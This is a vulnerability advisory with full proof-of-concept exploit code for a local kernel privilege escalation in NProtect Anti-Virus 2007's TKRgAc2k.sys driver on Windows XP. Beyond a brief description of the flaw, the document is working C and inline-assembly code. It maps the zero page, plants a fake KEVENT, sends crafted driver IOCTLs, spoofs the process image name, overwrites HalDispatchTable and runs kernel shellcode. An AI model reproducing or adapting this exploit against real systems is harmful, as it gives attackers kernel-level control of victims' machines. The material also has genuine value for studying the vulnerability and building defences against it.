@@ -1,0 +1,622 @@
+NProtect  Anti-Virus 2007  with  TKRgAc2k.sys  <= 2010.5.11.1 
+Local Kernel Mode Privilege Escalation Vulnerability
+
+
+AUTHOR
+MJ0011
+
+EMAIL
+th_decoder$126.com
+
+VULNERABLE PRODUCTS
+NProtect Anti-Virus 2007
+
+DETAILS:
+TKRgAc2k.sys create a device called "TKRgAc",and handles these io control codes for:
+
+0x22140:Receive registry monitor key value name MD5
+0x221448:Receive Registry monitor key name 
+0x221444:Receive Registry key monitor enable
+0x221410:Receive virus name that matchs the key value name MD5
+0x220c54:Create share memory for receive virus notification
+0x220c5c:Receive event handle for send virus notification
+Tkacrg2k.sys create FileObject->FsContext for each process to open the device,and save key/key value /virus name /event object in FsContext. Here contains a design error , if a registry operation is intercepted and match the rules , but event handle has not been set, TKAcRg2k.sys will still be nofity of this event to ring3 with KeSetEvent(NULL,0). An attacker can allocate a fake KEVENT structure at zero address and overwrite any address with KEvent->WaitThreadList->KThread->WaitListEntry 's remove list entry operation. 
+
+
+
+EXPLOIT CODE:
+// NP0DAY.cpp : Defines the entry point for the console application.
+//
+#include "stdafx.h"
+#include "windows.h"
+typedef struct _STRING {  
+    USHORT Length;  
+    USHORT MaximumLength;  
+    PCHAR Buffer;  
+} STRING;  
+typedef STRING *PSTRING;  
+typedef struct _RTL_DRIVE_LETTER_CURDIR {  
+    USHORT Flags;  
+    USHORT Length;  
+    ULONG TimeStamp;  
+    STRING DosPath;  
+} RTL_DRIVE_LETTER_CURDIR, *PRTL_DRIVE_LETTER_CURDIR;  
+typedef struct _UNICODE_STRING {  
+    USHORT Length;  
+    USHORT MaximumLength;  
+    PWSTR  Buffer;  
+} UNICODE_STRING;  
+typedef UNICODE_STRING *PUNICODE_STRING;  
+typedef const UNICODE_STRING *PCUNICODE_STRING;  
+#define RTL_MAX_DRIVE_LETTERS 32  
+#define RTL_DRIVE_LETTER_VALID (USHORT)0x0001  
+typedef struct _CURDIR {  
+    UNICODE_STRING DosPath;  
+    HANDLE Handle;  
+} CURDIR, *PCURDIR;  
+typedef struct _RTL_USER_PROCESS_PARAMETERS {  
+    ULONG MaximumLength;  
+    ULONG Length;  
+    ULONG Flags;  
+    ULONG DebugFlags;  
+    HANDLE ConsoleHandle;  
+    ULONG  ConsoleFlags;  
+    HANDLE StandardInput;  
+    HANDLE StandardOutput;  
+    HANDLE StandardError;  
+    CURDIR CurrentDirectory;        // ProcessParameters  
+    UNICODE_STRING DllPath;         // ProcessParameters  
+    UNICODE_STRING ImagePathName;   // ProcessParameters  
+    UNICODE_STRING CommandLine;     // ProcessParameters  
+    PVOID Environment;              // NtAllocateVirtualMemory  
+    ULONG StartingX;  
+    ULONG StartingY;  
+    ULONG CountX;  
+    ULONG CountY;  
+    ULONG CountCharsX;  
+    ULONG CountCharsY;  
+    ULONG FillAttribute;  
+    ULONG WindowFlags;  
+    ULONG ShowWindowFlags;  
+    UNICODE_STRING WindowTitle;     // ProcessParameters  
+    UNICODE_STRING DesktopInfo;     // ProcessParameters  
+    UNICODE_STRING ShellInfo;       // ProcessParameters  
+    UNICODE_STRING RuntimeData;     // ProcessParameters  
+    RTL_DRIVE_LETTER_CURDIR CurrentDirectores[ RTL_MAX_DRIVE_LETTERS ];  
+} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;  
+typedef struct _PEB {  
+    BOOLEAN InheritedAddressSpace;      // These four fields cannot change unless the  
+
+    BOOLEAN ReadImageFileExecOptions;   //  
+    BOOLEAN BeingDebugged;              //  
+    BOOLEAN SpareBool;                  //  
+    HANDLE Mutant;                      // INITIAL_PEB structure is also updated.  
+
+    PVOID ImageBaseAddress;  
+    PVOID Ldr;  
+    struct _RTL_USER_PROCESS_PARAMETERS *ProcessParameters;  
+} PEB, *PPEB;  
+typedef LONG KPRIORITY;  
+typedef struct _PROCESS_BASIC_INFORMATION {  
+    LONG ExitStatus;  
+    PVOID PebBaseAddress;  
+    ULONG_PTR AffinityMask;  
+    KPRIORITY BasePriority;  
+    ULONG_PTR UniqueProcessId;  
+    ULONG_PTR InheritedFromUniqueProcessId;  
+} PROCESS_BASIC_INFORMATION,*PPROCESS_BASIC_INFORMATION;  
+typedef enum _EVENT_TYPE {
+    NotificationEvent,
+SynchronizationEvent
+} EVENT_TYPE;
+typedef struct _DISPATCHER_HEADER {
+    union {
+        struct {
+            UCHAR Type;
+            union {
+                UCHAR Absolute;
+                UCHAR NpxIrql;
+            };
+            union {
+                UCHAR Size;
+                UCHAR Hand;
+            };
+            union {
+                UCHAR Inserted;
+                BOOLEAN DebugActive;
+            };
+        };
+        volatile LONG Lock;
+    };
+    LONG SignalState;
+    LIST_ENTRY WaitListHead;
+} DISPATCHER_HEADER , *PDISPATCHER_HEADER;
+typedef const UNICODE_STRING *PCUNICODE_STRING;
+typedef enum _WAIT_TYPE {
+    WaitAll,
+WaitAny
+    } WAIT_TYPE;
+typedef struct _OBJECT_BASIC_INFORMATION {
+    ULONG Attributes;
+    ACCESS_MASK GrantedAccess;
+    ULONG HandleCount;
+    ULONG PointerCount;
+    ULONG PagedPoolCharge;
+    ULONG NonPagedPoolCharge;
+    ULONG Reserved[ 3 ];
+    ULONG NameInfoSize;
+    ULONG TypeInfoSize;
+    ULONG SecurityDescriptorSize;
+    LARGE_INTEGER CreationTime;
+} OBJECT_BASIC_INFORMATION, *POBJECT_BASIC_INFORMATION;
+typedef struct _KWAIT_BLOCK {
+    LIST_ENTRY WaitListEntry;
+    PVOID kThread;
+    PVOID Object;
+    struct _KWAIT_BLOCK *NextWaitBlock;
+    USHORT WaitKey;
+    UCHAR WaitType;
+} KWAIT_BLOCK, *PKWAIT_BLOCK, *PRKWAIT_BLOCK;
+#include "malloc.h"
+PVOID GetInfoTable(ULONG ATableType)
+{
+ULONG mSize = 0x4000;
+PVOID mPtr = NULL;
+LONG status;
+HMODULE hlib = GetModuleHandle("ntdll.dll");
+PVOID pZwQuerySystemInformation = GetProcAddress(hlib , "ZwQuerySystemInformation");
+
+do
+{
+mPtr = malloc(mSize);
+if (mPtr)
+{
+__asm
+{
+push 0
+push mSize
+push mPtr
+push ATableType
+call pZwQuerySystemInformation
+mov status , eax
+}
+}
+else
+{
+return NULL;
+}
+if (status == 0xc0000004)
+{
+free(mPtr);
+mSize = mSize * 2;
+}
+} while (status == 0xc0000004);
+if (status == 0)
+{
+return mPtr;
+}
+free(mPtr);
+return NULL;
+}
+typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
+    USHORT UniqueProcessId;
+    USHORT CreatorBackTraceIndex;
+    UCHAR ObjectTypeIndex;
+    UCHAR HandleAttributes;
+    USHORT HandleValue;
+    PVOID Object;
+    ULONG GrantedAccess;
+} SYSTEM_HANDLE_TABLE_ENTRY_INFO, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO;
+typedef struct _SYSTEM_HANDLE_INFORMATION {
+    ULONG NumberOfHandles;
+    SYSTEM_HANDLE_TABLE_ENTRY_INFO Information[ 1 ];
+} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;
+enum { SystemModuleInformation = 11,
+SystemHandleInformation = 16 };
+typedef struct {
+    ULONG   Unknown1;
+    ULONG   Unknown2;
+    PVOID   Base;
+    ULONG   Size;
+    ULONG   Flags;
+    USHORT Index;
+    USHORT NameLength;
+    USHORT LoadCount;
+    USHORT PathLength;
+    CHAR    ImageName[256];
+} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;
+typedef struct {
+    ULONG   Count;
+    SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
+} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;
+typedef VOID (WINAPI *PINBV_ACQUIRE_DISPLAY_OWNERSHIP)(VOID);
+typedef BOOLEAN (WINAPI *PINBV_RESET_DISPLAY)(VOID);
+typedef VOID (WINAPI *PINBV_SOLID_COLOR_FILL)(
+  ULONG x1,
+  ULONG y1,
+  ULONG x2,
+  ULONG y2,
+  ULONG color
+    );
+typedef ULONG (WINAPI *PINBV_SET_TEXT_COLOR)(
+  ULONG Color
+    );
+typedef
+VOID
+(*INBV_DISPLAY_STRING_FILTER)(
+  PUCHAR *Str
+    );
+typedef VOID (WINAPI *PINBV_INSTALL_DISPLAY_STRING_FILTER)(
+    INBV_DISPLAY_STRING_FILTER DisplayStringFilter
+    );
+typedef BOOLEAN (WINAPI *PINBV_ENABLE_DISPLAY_STRING)(
+    BOOLEAN bEnable
+    );
+typedef VOID (WINAPI *PINVB_SET_SCROLL_REGION)(
+    ULONG x1,
+    ULONG y1,
+    ULONG x2,
+    ULONG y2
+    );
+typedef VOID (WINAPI *PINBV_DISPLAY_STRING)(
+    PUCHAR Str
+    );
+PINBV_ACQUIRE_DISPLAY_OWNERSHIP InbvAcquireDisplayOwnership = 0 ; 
+PINBV_RESET_DISPLAY InbvResetDisplay = 0 ; 
+PINBV_SOLID_COLOR_FILL InbvSolidColorFill = 0 ; 
+PINBV_SET_TEXT_COLOR InbvSetTextColor = 0 ; 
+PINBV_INSTALL_DISPLAY_STRING_FILTER InbvInstallDisplayStringFilter = 0 ; 
+PINBV_ENABLE_DISPLAY_STRING InbvEnableDisplayString = 0 ; 
+PINVB_SET_SCROLL_REGION InbvSetScrollRegion = 0 ; 
+PINBV_DISPLAY_STRING InbvDisplayString= 0 ; 
+#define VGA_COLOR_BLACK 0
+#define VGA_COLOR_RED 1
+#define VGA_COLOR_GREEN 2
+#define VGA_COLOR_GR 3
+#define VGA_COLOR_BULE 4
+#define VGA_COLOR_DARK_MEGAENTA 5
+#define VGA_COLOR_TURQUOISE 6
+#define VGA_COLOR_GRAY 7
+#define VGA_COLOR_BRIGHT_GRAY 8
+#define VGA_COLOR_BRIGHT_RED 9
+#define VGA_COLOR_BRIGHT_GREEN 10
+#define VGA_COLOR_BRIGHT_YELLOW 11
+#define VGA_COLOR_BRIGHT_BULE 12
+#define VGA_COLOR_BRIGHT_PURPLE 13
+#define VGA_COLOR_BRIGHT_TURQUOISE 14
+#define VGA_COLOR_WHITE 15
+UCHAR DisplayString[] = 
+"                                                                                "
+
+"                                                                                "
+
+"                                                                                "
+
+"                ---- ===== EXPLOIT SUCCESSFULLY ==== ----                       "
+
+"                                                                                "
+
+"                                                                                "
+
+" NProtect AntiVirus 2007 Local Privilege Escalation Exploit                     "
+
+"                                                                                "
+
+" VULNERABLE PRODUCT                                                             "
+
+"                                                                                "
+
+" NProtect AntiVirus 2007                                                        "
+
+"                                                                                "
+
+"                                                                                "
+
+" VULERABLE FILE                                                                 "
+
+" TKRgAc2k.sys <= 2010.5.11.1                                                    "
+
+"                                                                                "
+
+" AUTHOR                                                                         "
+
+"                                                                                "
+
+" MJ0011                                                                         "
+
+" th_decoder$126.com                                                             "
+
+"                                                                                "
+
+" 2010-9-7                                                                       "
+
+"                                                                                "
+
+"                                                                                "
+
+"                                                                                ";
+
+VOID InbvShellCode()
+{
+//DISABLE INTERRUPT
+__asm
+{
+cli
+}
+//RESET TO VGA MODE
+InbvAcquireDisplayOwnership();
+InbvResetDisplay();
+//FILL FULL SCREEN
+InbvSolidColorFill(0 , 0 , 639 , 479 ,VGA_COLOR_BLACK);
+//SET TEXT COLOR
+InbvSetTextColor(VGA_COLOR_BRIGHT_GREEN);
+InbvInstallDisplayStringFilter(NULL);
+InbvEnableDisplayString(TRUE);
+InbvSetScrollRegion( 0 , 0 , 639 ,477);
+InbvDisplayString(DisplayString);
+while(TRUE)
+{
+};
+}
+BOOL InbvInit(PVOID ntosbase , PSTR ntosname)
+{
+HMODULE hlib = LoadLibrary(ntosname);
+if (hlib == NULL)
+{
+return FALSE ; 
+}
+InbvAcquireDisplayOwnership = (PINBV_ACQUIRE_DISPLAY_OWNERSHIP)((ULONG)GetProcAddress(hlib , "InbvAcquireDisplayOwnership") - (ULONG)hlib + (ULONG)ntosbase);
+
+InbvResetDisplay = (PINBV_RESET_DISPLAY)((ULONG)GetProcAddress(hlib , "InbvResetDisplay") - (ULONG)hlib + (ULONG)ntosbase);
+
+InbvSolidColorFill = (PINBV_SOLID_COLOR_FILL)((ULONG)GetProcAddress(hlib , "InbvSolidColorFill") - (ULONG)hlib + (ULONG)ntosbase);
+
+InbvSetTextColor = (PINBV_SET_TEXT_COLOR)((ULONG)GetProcAddress(hlib , "InbvSetTextColor") - (ULONG)hlib + (ULONG)ntosbase);
+
+InbvInstallDisplayStringFilter = (PINBV_INSTALL_DISPLAY_STRING_FILTER)((ULONG)GetProcAddress(hlib , "InbvInstallDisplayStringFilter") - (ULONG)hlib + (ULONG)ntosbase);
+
+InbvEnableDisplayString = (PINBV_ENABLE_DISPLAY_STRING)((ULONG)GetProcAddress(hlib , "InbvEnableDisplayString") - (ULONG)hlib + (ULONG)ntosbase);
+
+InbvSetScrollRegion = (PINVB_SET_SCROLL_REGION)((ULONG)GetProcAddress(hlib , "InbvSetScrollRegion") - (ULONG)hlib + (ULONG)ntosbase);
+
+InbvDisplayString = (PINBV_DISPLAY_STRING)((ULONG)GetProcAddress(hlib , "InbvDisplayString") - (ULONG)hlib + (ULONG)ntosbase);
+
+if (InbvAcquireDisplayOwnership &&
+InbvResetDisplay &&
+InbvSolidColorFill &&
+InbvSetTextColor &&
+InbvInstallDisplayStringFilter &&
+InbvEnableDisplayString &&
+InbvSetScrollRegion &&
+InbvDisplayString)
+{
+return TRUE ; 
+}
+return FALSE ; 
+}
+typedef struct MD5_STRING{
+CHAR Md5[32];
+}MD5_STRING , *PMD5_STRING;
+typedef struct MD5_SEND{
+ULONG Md5Number ; 
+ULONG DataLen ; 
+MD5_STRING Md5String[2];
+}MD5_SEND , *PMD5_SEND;
+typedef struct MON_RULE_SEND
+{; 
+ULONG unknown ; 
+ULONG dataLen ; 
+CHAR RuleData1[10];
+CHAR RuleData2[9];
+}MON_RULE_SEND , *PMON_RULE_SEND;
+typedef struct VIRUS_NAME_RULE_SEND
+{
+ULONG NumberOfName ; 
+ULONG TotalDataLen ;
+CHAR Name[0x64];
+}VIRUS_NAME_RULE_SEND , *PVIRUS_NAME_RULE_SEND;
+int main(int argc, char* argv[])
+{
+printf("NProtect AntiVirus TKRgAc2k.sys <= 2010.5.11.1\n"
+"Local Kernel Mode Privilege Escalation Vulnerability POC\n\n"
+"Test On Windows XP SP3\n"
+"by MJ0011 th_decoder$126.com\n"
+"Press Enter....\n"
+);
+getchar();
+PSYSTEM_MODULE_INFORMATION pmi = (PSYSTEM_MODULE_INFORMATION)GetInfoTable(SystemModuleInformation);
+
+if (!InbvInit(pmi->Module[0].Base , strrchr(pmi->Module[0].ImageName , '\\')+1))
+{
+printf("cannot init inbv system\n");
+return 0 ;
+}
+HMODULE hntos = LoadLibrary(strrchr(pmi->Module[0].ImageName , '\\')+1);
+if (hntos == 0 )
+{
+printf("cannot load ntos\n");
+return 0 ; 
+}
+PVOID pHalDispatchTable = GetProcAddress(hntos , "HalDispatchTable");
+pHalDispatchTable = (PVOID)((ULONG)pHalDispatchTable - (ULONG)hntos);
+pHalDispatchTable = (PVOID)((ULONG)pHalDispatchTable + (ULONG)pmi->Module[0].Base);
+
+PVOID xHalQuerySystemInformationAddr = (PVOID)((ULONG)pHalDispatchTable+ sizeof(ULONG));
+
+FreeLibrary(hntos);
+PVOID palloc = GetProcAddress(GetModuleHandle("ntdll.dll") , "NtAllocateVirtualMemory");
+
+ULONG nsize = 0x1000 ; 
+PVOID pBase = (PVOID)0x1 ; 
+LONG status ;
+__asm
+{
+push 0x4
+push 0x3000
+lea eax , nsize
+push eax
+push 0 
+lea eax , pBase
+push eax
+push 0xffffffff
+call palloc
+mov status , eax
+}
+if (status != 0 )
+{
+printf("allocate at 0 failed! %08x\n",status);
+getchar();
+return 0 ; 
+}
+//build fake KEVENT
+PDISPATCHER_HEADER pdh = (PDISPATCHER_HEADER)0x0 ; 
+KWAIT_BLOCK kwb ; 
+BYTE pShellCode[0x20];
+KWAIT_BLOCK kwbpdh ; 
+pdh->Type = SynchronizationEvent;
+pdh->WaitListHead.Flink = (PLIST_ENTRY)&kwbpdh ; 
+PVOID pkthread = malloc(0x1000);
+kwbpdh.WaitType = WaitAny ; 
+kwbpdh.kThread = pkthread;
+*(ULONG*)((ULONG)pkthread+ 0x5c) = (ULONG)&kwb ; 
+kwb.WaitListEntry.Flink = (PLIST_ENTRY)pShellCode ; 
+kwb.WaitListEntry.Blink = (PLIST_ENTRY)xHalQuerySystemInformationAddr ; 
+kwb.NextWaitBlock = &kwb ; 
+//wait list entry
+*(ULONG*)((ULONG)pkthread+ 0x60) = 0 ; 
+//Thread->Timer->Header->Inserted 
+*(BOOLEAN*)((ULONG)pkthread+ 0xF3) = FALSE ;
+//Thread->Queue
+*(ULONG*)((ULONG)pkthread+ 0xe4) = NULL ; 
+#define LOW_REALTIME_PRIORITY 16 
+//thread->Priority
+*(BYTE*)((ULONG)pkthread+ 0x33) = LOW_REALTIME_PRIORITY ;
+//thread->eprocess
+PVOID pkprocess = malloc(0x1000);
+*(ULONG*)((ULONG)pkthread+ 0x44)  = (ULONG)pkprocess;
+//kprocess->state
+*(BYTE*)((ULONG)pkprocess + 0x65) = 2 ;
+PVOID preadylist = malloc(0x1000);
+*(ULONG*)((ULONG)pkprocess + 0x44) = (ULONG)preadylist; 
+HANDLE hdev = CreateFile("\\\\.\\TKRgAc" , FILE_READ_ATTRIBUTES , FILE_SHARE_READ , 0 , OPEN_EXISTING , 0 , 0 );
+
+if (hdev == INVALID_HANDLE_VALUE)
+{
+printf("cannot open dev %u\n" , GetLastError());
+return 0 ; 
+}
+MD5_SEND ms ; 
+memset(&ms , 0 , sizeof(ms));
+ms.DataLen = 32 * 2 + 8 ; 
+ms.Md5Number = 1 ; 
+strcpy(ms.Md5String->Md5 , "202CB962AC59075B964B07152D234B70");
+//202CB962AC59075B964B07152D234B70 = "123"
+ULONG btr ; 
+if (!DeviceIoControl(hdev , 0x22140C, &ms , sizeof(ms) , NULL , 0 , &btr , 0))
+{
+printf("send md5 %u\n", GetLastError());
+getchar();
+return 0 ; 
+}
+MON_RULE_SEND mrs ; 
+memset(&mrs , 0 , sizeof(mrs));
+mrs.dataLen = 0x13 ;
+strcpy(mrs.RuleData1 , "*Classes*");
+strcpy(mrs.RuleData2 , "*CLSID*"); 
+if (!DeviceIoControl(hdev , 0x221448 , &mrs , sizeof(mrs) , NULL , 0 , &btr, 0 ))
+
+{
+printf("send rule %u\n",GetLastError());
+getchar();
+return 0 ; 
+}
+BOOLEAN open741 = FALSE ; 
+if (!DeviceIoControl(hdev , 0x221008 , &open741 , sizeof(BOOLEAN) , NULL , 0 , &btr , 0 ))
+
+{
+printf("open 741 %u\n",GetLastError());
+getchar();
+return 0 ; 
+}
+ULONG data[4];
+data[0] = 0x1dfff ; 
+data[1] = 0x0 ; 
+data[2] = 0x1 ; 
+data[3] = 0x1 ; 
+if (!DeviceIoControl(hdev , 0x221444 , &data , sizeof(ULONG) * 4 , NULL , 0 , &btr , 0 ))
+
+{
+printf("set 724 %u\n" , GetLastError());
+getchar();
+return 0 ; 
+}
+VIRUS_NAME_RULE_SEND vnrs ; 
+memset(&vnrs , 0 , sizeof(vnrs));
+strcpy(vnrs.Name , "VULN ATTACK !!!! :)");
+vnrs.NumberOfName = 1 ; 
+vnrs.TotalDataLen = 0x64 ; 
+if (!DeviceIoControl(hdev , 0x221410 , &vnrs , sizeof(vnrs )  , NULL , 0 , &btr , 0 ))
+
+{
+printf("send virus name %u\n" , GetLastError());
+getchar();
+return 0 ; 
+}
+ULONG numbuf = 0x64 ; 
+ULONG outbuf[2];
+if (!DeviceIoControl(hdev , 0x220C54 ,&numbuf , sizeof(ULONG) , &outbuf , sizeof(ULONG) * 2  , &btr , 0 ))
+
+{
+printf("set share memory %u\n" ,GetLastError());
+getchar();
+return 0 ; 
+}
+//fake PEB bypass check 
+PVOID pqp = GetProcAddress(GetModuleHandle("ntdll.dll") , "NtQueryInformationProcess");
+
+PROCESS_BASIC_INFORMATION pbi ; 
+nsize = sizeof(pbi);
+__asm
+{
+push 0 
+push nsize
+lea eax , pbi
+push eax
+push 0
+push 0xffffffff
+call pqp 
+}
+PPEB peb = (PPEB)pbi.PebBaseAddress;
+PVOID psavebuf = malloc(peb->ProcessParameters->ImagePathName.Length );
+RtlCopyMemory(psavebuf , peb->ProcessParameters->ImagePathName.Buffer , peb->ProcessParameters->ImagePathName.Length);
+
+RtlCopyMemory(peb->ProcessParameters->ImagePathName.Buffer , L"iexplore.exe" , 26 );
+
+HKEY hkey ; 
+if (RegOpenKey(HKEY_CLASSES_ROOT , "CLSID" , &hkey)==ERROR_SUCCESS)
+{
+DWORD regtype = REG_DWORD ; 
+DWORD Data  = 0 ; 
+DWORD cbdata = 4; 
+//target KeSetEvent!
+RegQueryValueEx(hkey , "123" , NULL , ®type , (LPBYTE)&Data , &cbdata);
+}
+RtlCopyMemory(peb->ProcessParameters->ImagePathName.Buffer , psavebuf , peb->ProcessParameters->ImagePathName.Length);
+
+//set shellcode
+*(BYTE*)((ULONG)pShellCode) = 0xe9 ; 
+*(ULONG*)((ULONG)pShellCode + 0x1) = (ULONG)InbvShellCode - (ULONG)pShellCode - 0x5 ; 
+
+PVOID pqi = GetProcAddress(GetModuleHandle("ntdll.dll" ) , "NtQueryIntervalProfile");
+
+__asm
+{
+push 0 
+push 2
+call pqi 
+}
+return 0;
+}
+
+
+      
